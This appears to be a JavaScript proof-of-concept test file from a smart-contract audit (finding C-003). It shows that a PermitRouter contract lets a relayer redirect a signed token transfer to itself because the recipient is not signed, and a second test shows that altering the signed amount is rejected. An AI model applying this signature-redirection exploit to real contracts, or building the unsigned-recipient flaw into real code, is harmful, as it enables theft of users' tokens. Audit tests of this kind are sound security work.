import assert from "node:assert/strict";
import { before, test } from "node:test";
import { blockDeadline, compileAll, deploy, ether, ethers, expectRevert, makeChain, send } from "../../../test/support.mjs";

let artifacts;

before(async () => {
  artifacts = await compileAll();
});

async function setup() {
  const chain = await makeChain();
  const [admin, owner, intendedRecipient, attackerRelayer] = chain.signers;
  const ownerWallet = chain.wallets[1];
  const token = await deploy(artifacts, "MockERC20", admin, ["Aster Dollar", "aUSD", 18]);
  const router = await deploy(artifacts, "PermitRouter", admin);
  await send(token.mint(await owner.getAddress(), ether(50)));
  await send(token.connect(owner).approve(await router.getAddress(), ether(50)));
  const deadline = await blockDeadline(chain.provider);
  return { chain, owner, ownerWallet, intendedRecipient, attackerRelayer, token, router, deadline };
}

async function signCurrentPermit({ owner, ownerWallet, token, router, deadline }, amount) {
  const nonce = await router.nonces(await owner.getAddress());
  const payload = ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(
    ["bytes32", "address", "address", "uint256", "uint256", "uint256"],
    [await router.TRANSFER_TYPEHASH(), await owner.getAddress(), await token.getAddress(), amount, nonce, deadline]
  ));
  return ownerWallet.signMessage(ethers.getBytes(payload));
}

test("positive: relayer redirects a valid transfer signature because recipient is not signed", async () => {
  const context = await setup();
  const amount = ether(25);
  const intended = await context.intendedRecipient.getAddress();
  const attacker = await context.attackerRelayer.getAddress();
  const signature = await signCurrentPermit(context, amount);

  await send(context.router.connect(context.attackerRelayer).executeTransfer(
    await context.owner.getAddress(), await context.token.getAddress(), amount, attacker, context.deadline, signature
  ));

  assert.equal(await context.token.balanceOf(intended), 0n);
  assert.equal(await context.token.balanceOf(attacker), amount);
  assert.equal(await context.router.nonces(await context.owner.getAddress()), 1n);
  console.log(JSON.stringify({ oracle: "C-003-positive", intendedRecipient: intended, actualRecipient: attacker, intendedBalance: "0", attackerBalance: String(amount), nonceAfter: "1" }));
});

test("negative: changing an encoded amount invalidates the same kind of signature", async () => {
  const context = await setup();
  const signedAmount = ether(25);
  const alteredAmount = signedAmount + 1n;
  const attacker = await context.attackerRelayer.getAddress();
  const signature = await signCurrentPermit(context, signedAmount);

  await expectRevert(context.router.connect(context.attackerRelayer).executeTransfer(
    await context.owner.getAddress(), await context.token.getAddress(), alteredAmount, attacker, context.deadline, signature
  ));
  assert.equal(await context.token.balanceOf(attacker), 0n);
  assert.equal(await context.router.nonces(await context.owner.getAddress()), 0n);
  console.log(JSON.stringify({ oracle: "C-003-negative", encodedAmountChangeRejected: true, attackerBalance: "0", nonceAfter: "0" }));
});

